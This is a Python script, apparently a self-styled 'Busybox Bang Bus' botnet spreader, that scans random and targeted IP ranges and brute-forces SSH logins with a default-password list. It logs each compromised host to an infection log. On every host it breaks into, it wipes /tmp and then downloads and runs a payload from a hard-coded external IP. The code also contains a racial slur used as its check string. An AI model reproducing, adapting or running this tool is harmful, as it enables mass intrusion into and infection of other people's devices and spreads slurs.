#!/usr/bin/env python
# Busybox Bang Bus v1
#Made By Pluto & Light
# python attack.py 376 BRAZIL x 0 (SCANS BRAzIL)
# python attack.py 376 LUCKY x 0 (LUCKY B RANGES)
# python attack.py 376 LUCKY2 x 0 (SECONDARY LUCKY B RANGES)
# python attack.py 376 SUPER x 1 (LUCKY A RANGES)
# python attack.py 376 B 113.53 1 (SCANNER EXAMPLE)
# python attack.py 376 RAND x all (IP RANDOMIZATION)
# To setup: install "python-paramiko" then run the command "ulimit -s 999999; ulimit -n 999999; ulimit -u 999999; sysctl -w fs.file-max=999999 >/dev/null"

import threading, paramiko, random, socket, time, os, sys

if not os.geteuid()==0:
    sys.exit("\nGOTTA BE ROOT TO RIDE DA BANG BUS YA DIG\n")

sys.stdout.write("\x1b]2;BuSyBoX BaNG BuS\x07")
os.system("clear")
os.system("echo -e 'ulimit -s 999999; ulimit -n 999999; ulimit -u 999999\n' > ~/.bashrc")
os.system("ulimit -s 999999; ulimit -n 999999; ulimit -u 999999")
paramiko.util.log_to_file("/dev/null") #quiets paramiko output
os.system("sysctl -w fs.file-max=999999 >/dev/null")

passwords = [ # argv 0
    "root:root",
    "root:admin",
    "admin:admin",
    "ubnt:ubnt"
    "root:1234",
    "admin:1234",
    "guest:guest",
    "user:user",
    "test:test",
    "pi:raspberry",
    "vagrant:vagrant"
]

usage =  '<Threads(Recommended: 376)> <A/B/C/ (IP Class)> <Range> <1(slow but effective)/2(fast but less effective)/perl(scans for perlbots/all(scans for everything!>'
print "\033[36m" + usage + "\033[0m"
raw_input("Press <ENTER> to Enter the Bang Bus #BusyboxBangBus")
credit = '# DO NOT SHARE THIS FUCKING SHIT' #throwback lulz
print "\033[0m" + credit + "\033[0m"
if sys.argv[4] == '1':
    passwords = [ "root:root", "root:admin", "admin:admin", "ubnt:ubnt", "root:1234", "admin:1234", "guest:guest", "user:user", "test:test" ] #Slow but effective
if sys.argv[4] == '2':
    passwords = [ "root:root", "admin:admin" ] #Fast but yet less effective
if sys.argv[4] == 'perl':
    passwords = [ "pi:raspberry", "vagrant:vagrant", "ubnt:ubnt" ] #perl scanner
if sys.argv[4] == 'all':
    passwords = [ "pi:raspberry", "vagrant:vagrant", "root:root", "root:admin", "admin:admin", "ubnt:ubnt", "root:1234", "admin:1234", "guest:guest", "user:user", "test:test" ] # scans all passwords but very slow
if sys.argv[4] == 'ubnt':
    passwords = [ "ubnt:ubnt" ]

ipclassinfo = sys.argv[2]
if ipclassinfo == "A":
    ip1 = sys.argv[3]
elif ipclassinfo == "B":
    ip1 = sys.argv[3].split(".")[0]
    ip2 = sys.argv[3].split(".")[1]
elif ipclassinfo == "C":
    ips = sys.argv[3].split(".")
    num=0
    for ip in ips:
        num=num+1
        if num == 1:
            ip1 = ip
        elif num == 2:
            ip2 = ip
        elif num == 3:
            ip3 = ip

iplist = []
class ipgen(threading.Thread):
	if ipclassinfo == "A":
		global ip1
	elif ipclassinfo == "B":
		global ip1
		global ip2
	elif ipclassinfo == "C":
		global ip1
		global ip2
		global ip3
	def run(self):
		while 1:
			try:
				while 1:
						thisipisbad='no'
						yeet = ["122","131","161","37","186","187","31","188","201","2","200"]
						lucky = ["125.24","125.25","125.26","125.27","125.28","113.53","101.51","101.108","118.175","118.173","182.52"]
						br = ["179.105","179.152","189.29","189.32","189.33","189.34","189.35","189.39","189.4","189.54","189.55","189.60","189.61","189.62","189.63","189.126"]
						lucky2 = [ "122.178","122.170","182.65","182.68","182.70","182.75","186.112","186.113","186.114","186.115","186.116","186.118" ]
						if ipclassinfo == "A":
							self.host = 'http://'+ip1+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
						elif ipclassinfo == "B":
							self.host = 'http://'+ip1+'.'+ip2+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
						elif ipclassinfo == "C":
							self.host = 'http://'+ip1+'.'+ip2+'.'+ip3+'.'+str(random.randrange(0,256))
						elif ipclassinfo == "SUPER":
							self.host = 'http://'+random.choice(yeet)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
						elif ipclassinfo == "RAND":
							self.host = 'http://'+str(random.randrange(1,225))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
						elif ipclassinfo == "BRAZIL":
							self.host = 'http://'+random.choice(br)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
						elif ipclassinfo == "LUCKY":
							self.host = 'http://'+random.choice(lucky)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
						elif ipclassinfo == "LUCKY2":
							self.host = 'http://'+random.choice(lucky2)+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
						else:
							self.host = 'http://'+str(random.randrange(1,224))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))+'.'+str(random.randrange(0,256))
						#for badip in blacklist:
							#if badip in self.host:
								#thisipisbad='yes'
								#RESERVE = "Blacklisted IP Detected"
								#os.system("echo \033[37m" + RESERVE + "\033[0m")
						if any(self.host in s for s in iplist):
							thisipisbad='yes'
							#DUP = "DUP Detected"
							#os.system("echo \033[31m" + DUP + "\033[0m")
						if thisipisbad=='no':
							iplist.append(self.host)
							cock = sshscanner(self.host)
							cock.start()
			except:
				pass
class sshscanner(threading.Thread):
    def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = ip
		
    global passwords
    global ipclassinfo
    def run(self):
        while 1:
            try:
                self.ip=self.ip.replace('http://', '') 
                username='root'
                password="0"
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.ip, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.ip, port = port, username=username, password=password, timeout=3)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("echo nigger")
                output = stdout.read()
                if "nigger" in output:
                    badserver=False
                websites = [ ]			
                if badserver == False:
						os.system("echo -e " +username+ ":" +password+ ":" +self.ip+ " >> infection.log")
						print "\033[31m[\033[32m+\033[31m]\033[0m", random.choice(["\033[32mBuSyBoXiNG -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m",
							"\033[35mBuSyBoXiNG -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m",
							"\033[36mBuSyBoXiNG -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m"])
						ssh.exec_command("cd /tmp && rm -rf * && wget http://185.61.138.236/ubntp && chmod +x ubntp && ./ubntp")
                        			time.sleep(3)
	                			ssh.close()
            except:
                pass

for x in range(0,int(sys.argv[1])):
	try:				
		t = ipgen()
		t.start()
	except:
		pass # LiGhT ThA BoSs